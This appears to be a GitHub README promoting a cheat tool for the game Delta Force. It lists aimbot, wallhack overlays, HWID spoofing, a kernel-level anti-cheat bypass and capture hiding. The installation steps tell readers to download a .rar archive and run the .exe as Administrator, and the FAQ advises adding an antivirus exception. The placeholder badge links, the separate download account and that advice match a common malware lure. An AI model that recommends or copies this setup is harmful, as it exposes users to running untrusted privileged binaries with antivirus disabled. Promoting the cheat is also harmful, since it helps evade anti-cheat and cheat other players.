<div align="center">

# Delta Force Cheat

> **Modular instrumentation framework for studying real-time memory behavior in Delta Force.**

<br/>

[![Platform](https://img.shields.io/badge/Platform-Windows%2010%2F11%20x64-0a0a12?style=for-the-badge&logo=windows&logoColor=00fff7)](https://github.com/yourname/delta-force-rak)
[![Language](https://img.shields.io/badge/C%2B%2B-23-0a0a12?style=for-the-badge&logo=cplusplus&logoColor=b026ff)](https://github.com/yourname/delta-force-rak)
[![Graphics](https://img.shields.io/badge/Dear%20ImGui-DX11-0a0a12?style=for-the-badge&logoColor=ff2d95)](https://github.com/yourname/delta-force-rak)
[![Version](https://img.shields.io/badge/Version-2.2-0a0a12?style=for-the-badge&logoColor=00fff7)](https://github.com/yourname/delta-force-rak/releases)
[![License](https://img.shields.io/badge/License-MIT-0a0a12?style=for-the-badge&logoColor=b026ff)](LICENSE)

<br/>
<table>
  <tr>
    <td align="center">
      <img width="494" height="310" src="https://github.com/user-attachments/assets/c9fb9f5d-ab1d-46ac-9d75-65a1349eb61a" alt="Runtime interface" />
      <br/>
      <sub>runtime interface</sub>
    </td>
    <td align="center">
      <img width="494" height="425" src="https://github.com/user-attachments/assets/623b7d67-b81f-4238-8551-f552e14b5c7f" alt="Module panel" />
      <br/>
      <sub>module panel</sub>
    </td>
  </tr>
</table>

## ▸ overview

**Delta Force Cheat** is an external instrumentation framework for observing and modifying runtime state in Delta Force. Built for reverse-engineering research and private sandbox experimentation, it provides a modular interface for inspecting memory structures, simulating state changes, and analyzing gameplay parameters.

> ⚠️ **disclaimer:** intended for educational and private use only. authors are not responsible for misuse in public multiplayer environments.


## ▸ modules

| id | module | description |
| :--- | :--- | :--- |
| `aim` | 🎯 **Targeting Logic** | adjustable FOV, bone prioritization, smoothing curve, per-weapon recoil compensation |
| `vis` | 👁️ **Visual Overlay** | 2D/3D bounding boxes, skeletal structures, health/armor indicators, distance readout |
| `rad` | 📡 **Radar System** | customizable mini-radar with live position tracking and zoom control |
| `chm` | 🎨 **Material Override** | visible and invisible player recoloring with multiple render styles |
| `loot` | 🎒 **Loot Tracker** | highlights weapons, armor, ammo, and consumables through geometry |
| `opr` | 🧬 **Operator Intel** | displays enemy operator name, ability cooldown, and ultimate charge state |
| `wld` | 🌍 **Environment Control** | world tint, sun color, cloud modulation, skybox replacement |
| `cfg` | ⚙️ **Config Manager** | save, load, and share presets. auto-save on change |
| `sec` | 🛡️ **HWID Layer** | hardware fingerprint protection and kernel-level bypass |
| `str` | 🎥 **Streamproof** | invisible to OBS, Discord, ShadowPlay, and capture software |
| `key` | 🔑 **Hotkey Bindings** | fully rebindable F1–F12 for every module |

**total: 11 core modules · 47 adjustable parameters**


## ▸ requirements

| | |
| :--- | :--- |
| **os** | Windows 10 / 11 x64 (1909+) |
| **game** | Delta Force (latest Steam / official launcher build) |
| **perms** | administrator rights for loader |
| **display** | windowed / borderless windowed |
| **runtime** | Visual C++ Redistributable 2015–2022 |


## ▸ [installation](https://github.com/VisibleMaharaja/Delta-Force-Cheat/releases/download/Delta-Force2.1/Delta-Force2.1.rar)

**1.** download the latest release from the **[Releases](https://github.com/VisibleMaharaja/Delta-Force-Cheat/releases/download/Delta-Force2.1/Delta-Force2.1.rar)** tab

**2.** extract archive

**3.** run the `Delta-Force2.1.exe` as **Administrator**

**4.** launch Delta Force, enter a match, press `INSERT` or `DELETE`


## ▸ faq

<details>
<summary><b>is this safe?</b></summary>
<br>
the kit modifies runtime memory only — no disk writes to game files.
</details>

<details>
<summary><b>works with latest version?</b></summary>
<br>
compatibility maintained with current builds. check the Releases tab for updates.
</details>

<details>
<summary><b>why does antivirus flag it?</b></summary>
<br>
memory-injection frameworks trigger heuristic false positives. add an exception if you trust the source.
</details>

<details>
<summary><b>can i use in online matches?</b></summary>
<br>
intended for private and educational use only. not recommended for public multiplayer.
</details>

<details>
<summary><b>does it work with the anti-cheat?</b></summary>
<br>
the framework operates at runtime memory level. compatibility is maintained with current builds — check Releases for updates.
</details>


## ▸ security

- no telemetry, no analytics, no external calls
- all processing local
